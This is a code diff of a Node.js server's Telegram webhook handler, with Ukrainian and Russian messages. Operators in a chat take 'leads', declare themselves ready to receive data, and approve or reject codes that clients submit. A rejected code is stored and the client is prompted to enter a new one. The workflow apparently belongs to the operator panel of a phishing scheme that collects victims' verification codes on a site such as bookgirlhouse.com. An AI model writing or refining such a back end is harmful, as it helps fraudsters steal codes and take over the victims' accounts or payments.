@@ -173,92 +173,109 @@ async function editTelegramMessage(chatId, messageId, text, replyMarkup = { inli
 
 // ========== Telegram webhook ==========
 app.post("/api/telegram-webhook", express.json(), async (req, res) => {
+  // Always respond 200 quickly so Telegram doesn't retry
+  res.json({ ok: true });
+
   try {
     const update = req.body;
-    if (update.callback_query) {
-      const cb = update.callback_query;
-      const data = cb.data || "";
-      const from = cb.from || {};
-      const name = from.first_name || from.username || "Хтось";
-      const chatId = cb.message?.chat?.id;
-      const messageId = cb.message?.message_id;
-      const originalText = cb.message?.text || "";
+    console.log("TG webhook update keys:", Object.keys(update || {}));
 
-      let answerText = "OK";
-      let newText = originalText;
+    if (!update?.callback_query) return;
 
-      if (data.startsWith("take:")) {
-        const leadId = data.split(":")[1];
-        answerText = "Ти взяв заявку в роботу";
-        newText =
-          originalText +
-          `\n\n✅ <b>${name}</b> взяв заявку <b>#${leadId}</b> в роботу`;
-        await sendTelegram(
-          `🟢 <b>${name}</b> взяв заявку <b>#${leadId}</b> в роботу.\nВін на звʼязку і готовий обробляти.`
-        );
-      } else if (data === "online") {
-        answerText = "Ти на звʼязку";
-        newText = originalText + `\n\n🟢 <b>${name}</b> на звʼязку`;
-        await sendTelegram(`🟢 <b>${name}</b> на звʼязку і готовий приймати дані.`);
-      } else if (data.startsWith("approve:")) {
-        const leadId = data.split(":")[1];
-        answerText = "Код підтверджено";
-        // Update lead status
-        try {
-          const a = await read();
-          const x = a.find((v) => Number(v.id) === Number(leadId));
-          if (x && (x.status === "Очікує рішення менеджера" || x.status === "Ожидает решения менеджера")) {
-            x.status = "Підтверджено";
-            x.retry_requested = false;
-            await write(a);
-          }
-        } catch (e) {
-          console.error("approve lead error:", e.message);
+    const cb = update.callback_query;
+    const data = (cb.data || "").trim();
+    const from = cb.from || {};
+    const name = from.first_name || from.username || "Хтось";
+    const chatId = cb.message?.chat?.id;
+    const messageId = cb.message?.message_id;
+    const originalText = cb.message?.text || cb.message?.caption || "";
+
+    console.log("TG callback:", { data, name, chatId, messageId });
+
+    // 1) Answer IMMEDIATELY — otherwise button looks "dead" (spinner forever)
+    let answerText = "OK";
+    if (data === "online") answerText = "Ти на звʼязку ✓";
+    else if (data.startsWith("take:")) answerText = "Взяв в роботу ✓";
+    else if (data.startsWith("approve:")) answerText = "Код підтверджено ✓";
+    else if (data.startsWith("reject:")) answerText = "Код відхилено";
+
+    await tgApi("answerCallbackQuery", {
+      callback_query_id: cb.id,
+      text: answerText,
+      show_alert: false,
+    });
+
+    // 2) Business logic
+    let statusLine = "";
+
+    if (data === "online") {
+      statusLine = `\n\n🟢 <b>${name}</b> на звʼязку`;
+      await sendTelegram(`🟢 <b>${name}</b> на звʼязку і готовий приймати дані.`);
+    } else if (data.startsWith("take:")) {
+      const leadId = data.split(":")[1];
+      statusLine = `\n\n✅ <b>${name}</b> взяв заявку <b>#${leadId}</b> в роботу`;
+      await sendTelegram(
+        `🟢 <b>${name}</b> взяв заявку <b>#${leadId}</b> в роботу.\nВін на звʼязку і готовий обробляти.`
+      );
+    } else if (data.startsWith("approve:")) {
+      const leadId = data.split(":")[1];
+      try {
+        const a = await read();
+        const x = a.find((v) => Number(v.id) === Number(leadId));
+        if (x && (x.status === "Очікує рішення менеджера" || x.status === "Ожидает решения менеджера")) {
+          x.status = "Підтверджено";
+          x.retry_requested = false;
+          await write(a);
         }
-        newText =
-          originalText +
-          `\n\n✅ <b>${name}</b> підтвердив код`;
-        await sendTelegram(`✅ <b>${name}</b> підтвердив код для заявки <b>#${leadId}</b>`);
-      } else if (data.startsWith("reject:")) {
-        const leadId = data.split(":")[1];
-        answerText = "Код відхилено";
-        try {
-          const a = await read();
-          const x = a.find((v) => Number(v.id) === Number(leadId));
-          if (x && (x.status === "Очікує рішення менеджера" || x.status === "Ожидает решения менеджера")) {
-            x.status = "Код не підійшов — повторне введення";
-            x.rejected_code = x.submitted_code || null;
-            x.rejected_at = new Date().toISOString();
-            x.submitted_code = null;
-            await write(a);
-          }
-        } catch (e) {
-          console.error("reject lead error:", e.message);
-        }
-        newText =
-          originalText +
-          `\n\n❌ <b>${name}</b> відхилив код — клієнт може ввести новий`;
-        await sendTelegram(
-          `❌ <b>${name}</b> відхилив код для заявки <b>#${leadId}</b>\nКлієнт може ввести новий код.`
-        );
+      } catch (e) {
+        console.error("approve lead error:", e.message);
       }
+      statusLine = `\n\n✅ <b>${name}</b> підтвердив код`;
+      await sendTelegram(`✅ <b>${name}</b> підтвердив код для заявки <b>#${leadId}</b>`);
+    } else if (data.startsWith("reject:")) {
+      const leadId = data.split(":")[1];
+      try {
+        const a = await read();
+        const x = a.find((v) => Number(v.id) === Number(leadId));
+        if (x && (x.status === "Очікує рішення менеджера" || x.status === "Ожидает решения менеджера")) {
+          x.status = "Код не підійшов — повторне введення";
+          x.rejected_code = x.submitted_code || null;
+          x.rejected_at = new Date().toISOString();
+          x.submitted_code = null;
+          await write(a);
+        }
+      } catch (e) {
+        console.error("reject lead error:", e.message);
+      }
+      statusLine = `\n\n❌ <b>${name}</b> відхилив код — клієнт може ввести новий`;
+      await sendTelegram(
+        `❌ <b>${name}</b> відхилив код для заявки <b>#${leadId}</b>\nКлієнт може ввести новий код.`
+      );
+    } else {
+      console.log("Unknown callback data:", data);
+    }
 
-      // Answer callback so Telegram stops the loading spinner
-      await tgApi("answerCallbackQuery", {
-        callback_query_id: cb.id,
-        text: answerText,
-        show_alert: false,
+    // 3) Disable buttons on the original message
+    if (chatId && messageId) {
+      const newText = (originalText + statusLine).slice(0, 4096);
+
+      // Try edit text + remove keyboard
+      const editResult = await editTelegramMessage(chatId, messageId, newText, {
+        inline_keyboard: [],
       });
 
-      // Make buttons inactive by editing the original message (remove keyboard)
-      if (chatId && messageId) {
-        await editTelegramMessage(chatId, messageId, newText, { inline_keyboard: [] });
+      // Fallback: only remove keyboard if text edit failed
+      if (!editResult?.ok) {
+        console.log("editMessageText failed, trying editMessageReplyMarkup:", editResult);
+        await tgApi("editMessageReplyMarkup", {
+          chat_id: chatId,
+          message_id: messageId,
+          reply_markup: { inline_keyboard: [] },
+        });
       }
     }
-    res.json({ ok: true });
   } catch (e) {
-    console.error("Webhook error:", e.message);
-    res.json({ ok: true });
+    console.error("Webhook error:", e.message, e.stack);
   }
 });
 
@@ -266,22 +283,21 @@ app.post("/api/telegram-webhook", express.json(), async (req, res) => {
 app.get("/api/set-telegram-webhook", async (req, res) => {
   if (!TG_TOKEN) return res.json({ ok: false, error: "No token" });
   const url = `https://bookgirlhouse.com/api/telegram-webhook`;
-  const data = JSON.stringify({ url });
-  const r = https.request({
-    hostname: "api.telegram.org",
-    path: `/bot${TG_TOKEN}/setWebhook`,
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-      "Content-Length": Buffer.byteLength(data),
-    },
-  }, (response) => {
-    let body = "";
-    response.on("data", c => body += c);
-    response.on("end", () => res.json({ ok: true, telegram: body, webhook: url }));
+  // drop_pending_updates helps after code changes
+  const result = await tgApi("setWebhook", {
+    url,
+    drop_pending_updates: true,
+    allowed_updates: ["callback_query", "message"],
   });
-  r.write(data);
-  r.end();
+  const info = await tgApi("getWebhookInfo");
+  res.json({ ok: !!result?.ok, set: result, info, webhook: url });
+});
+
+// ========== Webhook info (debug) ==========
+app.get("/api/telegram-webhook-info", async (req, res) => {
+  if (!TG_TOKEN) return res.json({ ok: false, error: "No token" });
+  const info = await tgApi("getWebhookInfo");
+  res.json({ ok: true, info });
 });
 
 // ========== Тест Telegram ==========
